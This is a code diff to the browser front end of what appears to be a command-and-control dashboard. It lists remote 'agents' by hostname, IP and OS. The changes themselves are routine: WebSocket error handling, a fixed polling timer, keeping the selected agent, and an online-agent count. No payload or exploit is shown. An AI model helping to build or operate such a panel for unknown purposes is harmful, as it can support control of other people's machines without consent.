@@ -323,6 +323,13 @@ socket.on('connect', () => {
   loadAgents();
 });
 
+socket.on('connect_error', () => {
+  document.getElementById('conn-dot').className = 'status-dot';
+  document.getElementById('conn-label').textContent = 'WS Error - polling mode';
+  // Still load agents via HTTP even if WS fails
+  loadAgents();
+});
+
 socket.on('disconnect', () => {
   document.getElementById('conn-dot').className = 'status-dot';
   document.getElementById('conn-label').textContent = 'Disconnected';
@@ -377,6 +384,7 @@ function startFpsCounter() {
 }
 
 // ── Agent loading ─────────────────────────────────────
+let _agentsTimer = null;
 function loadAgents() {
   fetch('/functions/c2Server', {
     method: 'POST',
@@ -386,16 +394,29 @@ function loadAgents() {
   .then(r => r.json())
   .then(data => {
     const sel = document.getElementById('agent-select');
+    const current = sel.value;
     sel.innerHTML = '<option value="">-- Select Agent --</option>';
-    (data.agents || []).forEach(a => {
+    const agents = data.agents || [];
+    agents.forEach(a => {
       const opt = document.createElement('option');
       opt.value = a.agent_id;
       opt.textContent = `${a.hostname || a.agent_id} (${a.ip}) [${a.os}]`;
       sel.appendChild(opt);
     });
-  });
-  setInterval(loadAgents, 10000);
+    if (current) sel.value = current;
+    // Update agent count in header
+    document.getElementById('conn-label').textContent = 
+      `Connected | ${agents.length} agent${agents.length !== 1 ? 's' : ''} online`;
+  })
+  .catch(e => log('Failed to load agents: ' + e, 'warn'));
+  
+  if (!_agentsTimer) _agentsTimer = setInterval(loadAgents, 5000);
 }
+
+// Load agents immediately on page load (no need to wait for socket)
+window.addEventListener('DOMContentLoaded', () => {
+  loadAgents();
+});
 
 document.getElementById('agent-select').addEventListener('change', function() {
   selectedAgent = this.value;
